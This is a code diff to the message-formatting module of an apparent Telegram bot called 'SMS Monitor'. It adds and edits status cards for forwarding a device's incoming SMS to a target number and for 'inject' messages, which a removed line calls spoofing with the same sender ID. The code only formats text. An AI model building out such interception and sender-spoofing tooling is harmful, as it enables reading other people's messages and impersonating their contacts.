@@ -5,8 +5,8 @@ from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 
 from app.database import Device, MonitorProfile
 
-STARTUP_TEST_SENDER = "CHACHA"
-STARTUP_TEST_MESSAGE = "Chacha Ji Pani Pila Do?"
+STARTUP_TEST_SENDER = "ASTIK"
+STARTUP_TEST_MESSAGE = "hello baby aau kya?"
 BRAND_NAME = "SMS Monitor"
 
 
@@ -276,6 +276,48 @@ def format_sim_selected_card(device: Device, sim_index: int = 0) -> str:
     )
 
 
+def format_timing_footer(queued_ms: int, total_ms: int) -> str:
+    return f"⏱ queued {queued_ms}ms | total {total_ms}ms"
+
+
+def format_inject_startup_card(
+    sender: str,
+    message: str,
+    queued_ms: int = 3,
+    total_ms: int = 15,
+) -> str:
+    body = message.replace("<", "").replace(">", "").strip()
+    return (
+        "✅ <b>SUCCESS</b>\n"
+        "<pre>"
+        "⚡ INJECT FORWARDED! [STARTUP]\n"
+        f"📤 Sender: {sender}\n"
+        f"🔐 {body}\n"
+        f"{format_timing_footer(queued_ms, total_ms)}"
+        "</pre>"
+    )
+
+
+def format_inject_stream_card(
+    sender: str,
+    message: str,
+    queued_ms: int = 3,
+    total_ms: int = 22,
+) -> str:
+    body = message.replace("<", "").replace(">", "").strip()
+    if len(body) > 500:
+        body = body[:500] + "..."
+    return (
+        "✅ <b>SUCCESS</b>\n"
+        "<pre>"
+        "⚡ INJECT FORWARDED! [STREAM]\n"
+        f"📥 Sender: {sender}\n"
+        f"🔐 {body}\n"
+        f"{format_timing_footer(queued_ms, total_ms)}"
+        "</pre>"
+    )
+
+
 def format_mynum_set_card(phone: str) -> str:
     from app.services import display_phone
 
@@ -292,11 +334,16 @@ def format_mynum_set_card(phone: str) -> str:
 
 def format_auto_stop_card(minutes: int = 15) -> str:
     return (
-        "✅ <b>SUCCESS</b>\n\n"
+        "✅ <b>SUCCESS</b>\n"
         "<pre>"
-        f"⏱ AUTO-STOPPED ({minutes} min)"
+        "Monitoring STOPPED!\n"
+        "✅ No more SMS forward/inject."
         "</pre>"
     )
+
+
+def format_stop_card() -> str:
+    return format_auto_stop_card()
 
 
 def format_monitoring_card(
@@ -312,7 +359,6 @@ def format_monitoring_card(
     from app.services import display_phone
 
     target = display_phone(profile.phone_number) if profile.phone_number else "Not set"
-    channel = profile.channel_id or str(profile.telegram_user_id)
     auto_stop = profile.auto_stop_minutes or 15
     inject_key = get_inject_key(profile, device)
     test_msg = test_message or STARTUP_TEST_MESSAGE
@@ -323,13 +369,11 @@ def format_monitoring_card(
         "<pre>"
         "Monitoring Started!\n"
         f"📱 Device: {short_device_id(device.name)} | {device_phone}\n"
-        f"📶 FROM SIM: {sim_slot} ({sim_number})\n"
+        f"📶 FROM SIM: {sim_slot}\n"
         f"🔑 Inject Key: {inject_key}\n"
-        "📤 Incoming -&gt; spoof inject (same sender ID)\n"
         f"📞 Real SMS -&gt; {target}\n"
-        f"📢 Channel: {channel} (last /addchannel only)\n"
         f"⏱️ Auto-stop in {auto_stop} minutes\n"
-        f"📁 Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
+        f"📦 Ignored {ignored_sms} old SMS\n"
         f"✅ Test inject OK: {test_msg}"
         "</pre>"
     )
